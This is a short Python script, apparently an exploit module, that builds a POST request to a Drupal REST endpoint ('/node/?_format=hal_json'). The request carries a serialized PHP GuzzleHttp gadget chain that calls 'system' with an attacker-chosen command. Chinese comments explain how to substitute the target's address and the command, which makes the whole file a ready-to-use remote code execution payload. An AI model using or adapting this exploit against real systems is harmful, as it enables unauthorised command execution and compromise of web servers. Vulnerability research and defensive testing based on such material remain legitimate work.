# CVE-0000-0000
import json

def build(ip_port: str, cmd: str):
    url = "/node/?_format=hal_json"

    headers = {
        "Host": ip_port,  # 使用实际目标主机
        "Content-Type": "application/hal+json",
    }
    body = """{\r\n  "link": [\r\n    {\r\n      "value": "link",\r\n      "options": "O:24:\\"GuzzleHttp\\\\Psr7\\\\FnStream\\":2:{s:33:\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\";a:1:{s:5:\\"close\\";a:2:{i:0;O:23:\\"GuzzleHttp\\\\HandlerStack\\":3:{s:32:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\";s:2:\\"id\\";s:30:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\";a:1:{i:0;a:1:{i:0;s:6:\\"system\\";}}s:31:\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\";b:0;}i:1;s:7:\\"resolve\\";}}s:9:\\"_fn_close\\";a:2:{i:0;r:4;i:1;s:7:\\"resolve\\";}}"\r\n    }\r\n  ],\r\n  "_links": {\r\n    "type": {\r\n      "href": "http://192.168.159.133/rest/type/shortcut/default"\r\n    }\r\n  }\r\n}"""

    # 注意：按需替换IP端口和命令
    cmd_len = len(cmd)
    # 将原始 payload 中固定的 id 命令替换为自定义 cmd
    body = body.replace('s:2:\\"id\\"', f's:{cmd_len}:\\"{cmd}\\"')
    # 将原始 payload 中固定的目标地址替换为当前的 ip_port
    body = body.replace('http://192.168.159.133/', f'http://{ip_port}/')

    return {
        "method": "POST",
        "url": f"http://{ip_port}{url}",
        "headers": headers,
        "data": body,
    }
